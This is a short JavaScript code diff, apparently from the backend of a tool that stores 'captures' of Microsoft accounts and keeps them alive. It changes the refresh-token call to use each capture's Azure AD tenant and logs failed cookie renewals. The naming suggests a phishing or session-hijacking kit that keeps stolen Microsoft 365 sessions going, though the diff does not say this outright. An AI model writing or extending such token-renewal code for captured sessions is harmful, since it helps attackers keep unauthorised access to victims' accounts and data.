@@ -64,9 +64,21 @@ async function renewSingleCapture(capture, isPreemptive = false) {
       await sleep(attemptDelay);
     }
 
-    // Call Microsoft token endpoint with refresh token
+    // Fetch tenant for this capture to use correct Azure AD endpoint
+    let tenant = 'common';
+    try {
+      const [links] = await db.query('SELECT jwt_payload FROM links WHERE id = ?', [capture.link_id]);
+      if (links.length && links[0].jwt_payload) {
+        try {
+          const parsed = JSON.parse(links[0].jwt_payload);
+          if (parsed.tenant) tenant = parsed.tenant;
+        } catch (e) { /* use default */ }
+      }
+    } catch (e) { /* use default */ }
+
+    // Call Microsoft token endpoint with refresh token using the correct tenant
     const response = await axios.post(
-      `https://login.microsoftonline.com/common/oauth2/v2.0/token`,
+      `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`,
       new URLSearchParams({
         grant_type: 'refresh_token',
         refresh_token: refreshToken,
@@ -171,8 +183,8 @@ async function handleRenewalFailure(capture, errorMessage = 'Renewal failed') {
   }
 
   await db.query(
-    'INSERT INTO cookie_renewals (capture_id, user_id, success, ip_address, error_message) VALUES (?, ?, 0, ?, ?)',
-    [capture.id, capture.user_id, '127.0.0.1', `${errorMessage} (attempt ${newAttempts}/${maxAttempts})`]
+    'INSERT INTO cookie_renewals (capture_id, user_id, success, ip_address, error_message, renewal_type) VALUES (?, ?, 0, ?, ?, ?)',
+    [capture.id, capture.user_id, '127.0.0.1', `${errorMessage} (attempt ${newAttempts}/${maxAttempts})`, 'renewal_failed']
   );
 }
 
